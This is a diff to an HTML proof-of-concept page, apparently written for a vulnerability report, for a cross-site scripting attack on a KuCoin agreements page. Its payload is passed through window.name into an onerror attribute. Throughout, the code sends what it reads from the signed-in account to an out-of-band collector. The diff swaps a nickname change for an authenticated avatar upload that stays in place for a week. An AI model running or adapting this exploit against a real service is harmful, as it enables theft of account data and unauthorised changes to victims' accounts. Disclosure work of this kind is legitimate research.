@@ -25,7 +25,7 @@
 
   <button class="cta" id="go">Review agreement</button>
   <button class="cta alt" id="goTab">Review agreement (open in a new tab)</button>
-  <button class="cta alt" id="goWrite">Review agreement (read + authenticated write, change left in place)</button>
+  <button class="cta alt" id="goWrite">Review agreement (read + authenticated avatar upload)</button>
 
   <ol>
     <li>Click a button above. This page stores the payload in <code>window.name</code> and
@@ -56,8 +56,8 @@ var SINK = "https://www.kucoin.com/express/agreements/auto-conversion"
 // The payload. Written as a normal function so it can use any quoting it
 // likes; it is serialised and HTML-escaped below before it goes into the
 // window name, so the browser hands it back intact inside the onerror
-// attribute. Read-only - it performs no writes - but it does send what it
-// reads to the collector configured in OOB below.
+// attribute. It sends what it reads to the collector configured in OOB
+// below, and on the write button it also performs one authenticated upload.
 // ---------------------------------------------------------------------------
 function payload(OOB, DOWRITE) {
   var esc = function (s) {
@@ -196,43 +196,75 @@ function payload(OOB, DOWRITE) {
         return finish();
       }
 
-      var W = '/_api/ucenter/user/profile/commit-audit?lang=en_US&c=' + encodeURIComponent(csrf);
-      var H = { 'content-type': 'application/json', 'x-site': 'global' };
-      var NEWNICK = 'd0x-poc';
+      // The nickName field was the first candidate and is a dead end: it
+      // carries a 7-day server-side cooldown, so the write is refused by a
+      // business rule rather than by any security control, and any triager
+      // reproducing it would hit the same wall. The avatar upload is used
+      // instead. Note it carries the same 7-day cooldown, so a successful
+      // upload stays in place for a week.
+      var W = '/_api/ucenter/user/avatar/upload?lang=en_US&c=' + encodeURIComponent(csrf);
+      var AV = /"(avatar[a-zA-Z]*)"\s*:\s*"([^"]*)"/i;
+      var avatarBefore = (t.match(AV) || [])[2];
 
       summary.write = {
         attempted: true,
         endpoint: W.split('?')[0],
-        previous: origNick || null,
-        newValue: NEWNICK,
+        avatarBefore: avatarBefore || null,
+        nickNameFound: typeof origNick === 'string' && !!origNick ? origNick : null,
         reverted: false
       };
-      add('nickName before write', origNick || '(not found in user-info - restore value unknown)');
+      add('avatar before write', avatarBefore || '(no avatar field found in user-info)');
 
-      fetch(W, { method: 'POST', credentials: 'include', headers: H, body: JSON.stringify({ nickName: NEWNICK }) })
-        .then(function (r) {
-          return r.text().then(function (b) {
-            summary.write.status = r.status;
-            summary.write.body = b.slice(0, 300);
-            add('POST commit-audit (nickName -> ' + NEWNICK + ')', 'HTTP ' + r.status + '  ' + b.slice(0, 160));
-            return fetch('/_api/ucenter/user-info', { credentials: 'include' });
+      // The image is fabricated here rather than embedded. No base64 blob in
+      // the payload, and it demonstrates something a stolen token alone does
+      // not: the payload authors content inside the origin and uploads it as
+      // the signed-in user.
+      var cv = document.createElement('canvas');
+      cv.width = 256; cv.height = 256;
+      var cx = cv.getContext('2d');
+      cx.fillStyle = '#ff00ff'; cx.fillRect(0, 0, 256, 256);
+      cx.fillStyle = '#000000'; cx.font = 'bold 46px monospace';
+      cx.fillText('M125', 52, 118); cx.fillText('XSS', 78, 178);
+
+      cv.toBlob(function (blob) {
+        if (!blob) {
+          summary.write.error = 'canvas.toBlob returned null';
+          add('write', 'FAILED - could not build the image');
+          return finish();
+        }
+        var fd = new FormData();
+        fd.append('file', blob, 'poc.png');
+
+        // No content-type header here on purpose. FormData makes the browser
+        // set multipart/form-data together with the boundary; setting the
+        // header by hand omits the boundary and the server cannot parse the
+        // body at all.
+        fetch(W, { method: 'POST', credentials: 'include', headers: { 'x-site': 'global' }, body: fd })
+          .then(function (r) {
+            return r.text().then(function (b) {
+              summary.write.status = r.status;
+              summary.write.body = b.slice(0, 400);
+              summary.write.bytesUploaded = blob.size;
+              add('POST avatar/upload (' + blob.size + ' bytes)', 'HTTP ' + r.status + '  ' + b.slice(0, 200));
+              return fetch('/_api/ucenter/user-info', { credentials: 'include' });
+            });
+          })
+          .then(function (rc) { return rc.text(); })
+          .then(function (tc) {
+            var after = (tc.match(AV) || [])[2];
+            summary.write.avatarAfter = after || null;
+            summary.write.applied = !!after && after !== avatarBefore;
+            add('avatar after write', (after || '(not found)') + (summary.write.applied
+              ? '  (APPLIED - the stored avatar changed)'
+              : '  (unchanged - read the upload response above for the reason)'));
+            finish();
+          })
+          .catch(function (e) {
+            summary.write.error = String(e);
+            add('write chain', 'failed: ' + e);
+            finish();
           });
-        })
-        .then(function (rc) { return rc.text(); })
-        .then(function (tc) {
-          var now = (tc.match(/"nickName"\s*:\s*"([^"]*)"/) || [])[1];
-          summary.write.nickNameAfterWrite = now;
-          summary.write.applied = now === NEWNICK;
-          add('nickName after write', now + (now === NEWNICK
-            ? '  (APPLIED - the server now stores this; left in place)'
-            : '  (unchanged - endpoint returned ' + summary.write.status + ' but did not apply; likely queued for audit)'));
-          finish();
-        })
-        .catch(function (e) {
-          summary.write.error = String(e);
-          add('write chain', 'failed: ' + e);
-          finish();
-        });
+      }, 'image/png');
     })
     .catch(function (e) {
       summary.userInfo = { error: String(e) };
@@ -285,7 +317,7 @@ function sameTab(doWrite) {   // no popup involved, so no popup blocker
 document.getElementById('go').addEventListener('click', function () { sameTab(false); });
 document.getElementById('goTab').addEventListener('click', function () { window.open(SINK, buildName(false)); });
 document.getElementById('goWrite').addEventListener('click', function () {
-  if (confirm('This sets the nickName of the logged-in account to "d0x-poc" and LEAVES IT CHANGED. The previous value is shown on the result page so you can restore it by hand. Continue?')) sameTab(true);
+  if (confirm('This uploads a new avatar for the logged-in account and LEAVES IT CHANGED. KuCoin applies a 7-day cooldown to avatar changes, so it cannot be undone right away. Continue?')) sameTab(true);
 });
 </script>
 </body>
